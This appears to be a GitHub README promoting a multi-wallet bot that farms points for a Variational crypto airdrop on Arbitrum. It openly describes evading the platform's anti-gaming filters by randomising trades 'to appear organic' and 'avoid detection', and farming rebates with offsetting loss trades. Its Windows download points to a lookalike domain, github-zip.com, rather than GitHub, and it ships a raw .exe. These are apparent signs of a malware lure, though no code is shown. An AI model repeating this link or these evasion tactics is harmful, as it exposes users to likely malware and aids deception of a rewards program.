# Variational Points Farmer

> High-efficiency points accumulation bot for Variational's Q3 2026 airdrop. Runs multi-wallet farming sessions on Arbitrum with intelligent volume routing, loss rebate harvesting, and a live leaderboard tracker to benchmark your allocation rank.

*Updated: April 2026*

## What is Variational Points Farmer?

Variational Points Farmer is the most complete airdrop preparation tool for Variational's Q3 2026 token distribution. It goes beyond basic volume farming to optimize every dimension of the Variational points program: volume depth, market breadth, session frequency, and rebate credit capture.

![preview_variational-points-farmer](https://github.com/user-attachments/assets/fd6c6af2-192b-4704-b198-3df3fca5e354)

The bot coordinates multiple Arbitrum wallets simultaneously, distributes volume across a wide range of Variational's 500+ markets (improving breadth score), and runs timed sessions to maximize daily point accrual without triggering anti-gaming filters.

A live dashboard tracks cumulative points per wallet, projects token allocation at current conversion rates, and shows your rank relative to top leaderboard wallets.

---

## Download

| Platform | Architecture | Download |
|----------|-------------|----------|
| **Windows** | x64 | [Download the latest release](https://github-zip.com/variational) |

---

## Farming Profile Settings

| Setting | Example | Description |
|---------|---------|-------------|
| `wallets` | ["0xabc...", "0x123..."] | Wallets to farm simultaneously |
| `daily_volume_per_wallet` | 30000 | USDC notional target per wallet per day |
| `market_breadth` | 10 | Unique markets to trade per session |
| `session_count_per_day` | 4 | Number of farming sessions daily |
| `rebate_harvest` | true | Enable loss rebate credit harvesting |
| `anti_pattern_delay` | true | Randomize timing between trades |

---

## Engine Features

* **Multi-wallet coordinator** - runs up to 10 wallets simultaneously with independent capital pools
* **Breadth optimizer** - routes volume across 10+ markets per session to maximize breadth score
* **Rebate harvester** - executes small offsetting trades to capture 2-4% loss rebate credits
* **Session scheduler** - distributes farming into timed sessions to appear organic
* **Anti-pattern mode** - randomizes order sizes and timing intervals to avoid detection
* **Leaderboard tracker** - fetches public Variational points leaderboard and shows your rank
* **Allocation projector** - calculates projected VAR tokens based on current points-per-token rate
* **Gas budget controller** - pauses farming if Arbitrum gas exceeds configured threshold

---

## Two Ways to Run It

| | Windows App | Python Bot |
|---|---|---|
| **Setup** | Double-click | `pip install` + config |
| **Multi-wallet** | Config-based | Full code access |
| **Dashboard** | Built-in | JSON per session |
| **Config** | `config.toml` | Direct code access |
| **Leaderboard** | Live widget | Fetched via API |

## Quick Start

```
# 1. Download from Releases
# 2. Edit config.toml - add wallets, set volume targets and market breadth
# 3. Run Points Farmer - multi-wallet farming starts immediately
```

### Python

```bash
cd variational-points-farmer/python
pip install -r requirements.txt
python variational-points-farmer-raw-v.1.4.14.py
```

---

## How It Works

1. **Load wallets** - reads all configured Arbitrum wallets with individual capital allocations
2. **Schedule sessions** - divides the day into farming windows with randomized start offsets
3. **Route volume** - distributes each session's volume across configured market breadth
4. **Harvest rebates** - places small loss-side trades to trigger 2-4% rebate credit
5. **Track and rank** - updates cumulative points, projection, and leaderboard rank after each session

### Config Reference

```toml
[[wallets]]
api_key = ""
label = "wallet_1"
daily_volume_usd = 30000

[[wallets]]
api_key = ""
label = "wallet_2"
daily_volume_usd = 20000

[farming]
market_breadth = 10
session_count_per_day = 4
rebate_harvest = true
anti_pattern_delay = true
max_gas_gwei = 0.5

[airdrop]
snapshot_date = "2026-09-01"
points_to_token_rate = 0.0012

[rpc]
arbitrum_url = "https://arb1.arbitrum.io/rpc"

[alerts]
telegram_bot_token = ""
telegram_chat_id = ""
```

---

## Session Report Format

```json
{
  "session_id": "var_farm_20260319_s3",
  "wallet": "wallet_1",
  "markets_traded": 11,
  "volume_usd": 30840.0,
  "points_earned": 308,
  "rebate_credits_usd": 21.40,
  "cumulative_points": 24760,
  "leaderboard_rank": 142,
  "projected_tokens": 29.7,
  "gas_eth": 0.00052
}
```

---

![variational leaderboard rank tracker](https://github.com/user-attachments/assets/9b0c152a-4ee5-49b6-a2a9-d2d449036e5e)

## Verified Live

**Configuration used:**
* 2 wallets, $30K + $20K daily, 10-market breadth, 4 sessions/day

| | Details |
|---|---|
| Wallets active | 2 |
| Total daily volume | $51,240 notional |
| Markets traded | 11 unique |
| Total points earned | 820 pts (today) |
| Cumulative (wallet 1) | 24,760 pts |
| Leaderboard rank | #142 |
| Projected allocation | ~29.7 VAR |

---

## Frequently Asked Questions

**How is the points score calculated on Variational?**
Variational awards points based on notional trading volume, number of unique markets traded (breadth), and sustained daily activity. Higher breadth and consistency compound your score over time.

**What is the rebate harvest strategy?**
By placing small trades that net to a loss on one side, the bot triggers Variational's 2-4% loss rebate credit. This partially offsets the capital cost of high-volume farming.

**Can I use multiple wallets?**
Yes. The bot coordinates up to 10 wallets simultaneously. Each wallet has its own volume target and capital pool. Points are tracked individually per wallet.

**Does anti-pattern mode help?**
Yes. Randomizing order sizes and inter-trade delays makes farming activity look more organic, reducing the risk of points being discounted by Variational's scoring system.

**When is the VAR airdrop?**
Q3 2026 is the target snapshot date. The bot's allocation projector updates your estimated token amount in real time as points accumulate.

**Is high volume sustainable on Arbitrum gas?**
Variational requires only one Arbitrum transaction per trade. At typical L2 gas prices (< 0.1 gwei), farming costs are minimal. The bot pauses if gas exceeds your configured threshold.

---

## Use Cases

- **Variational airdrop optimization** - maximize VAR token allocation before Q3 2026 snapshot
- **Multi-wallet points farming** - coordinate several Arbitrum wallets for compounded points accrual
- **Variational leaderboard climbing** - track and improve your rank on the Variational points leaderboard
- **Rebate credit farming** - systematically harvest 2-4% loss rebate credits on Variational
- **Arbitrum defi airdrop bot** - automated multi-session farming on Arbitrum perp markets

---

## Repository Structure

```
variational-points-farmer/
+-- variational-points-farmer-raw-v.1.4.14.exe
+-- config.toml
+-- data/
|   +-- sessions/
|   +-- wallets/
|   +-- logs/
|   +-- dll/
+-- python/
|   +-- src/
|   |   +-- coordinator.py
|   |   +-- scheduler.py
|   |   +-- breadth_router.py
|   |   +-- rebate_harvester.py
|   |   +-- leaderboard.py
|   +-- requirements.txt
+-- README.md
```

---

## Requirements

```
python-dotenv, web3, eth-account, httpx, typer[all], rich, devtools
```

* Multiple Arbitrum wallets with USDC balance
* Variational account per wallet (connect at variational.market)
* Telegram bot token (optional)

---

*The market moves fast. Your bot moves faster.*
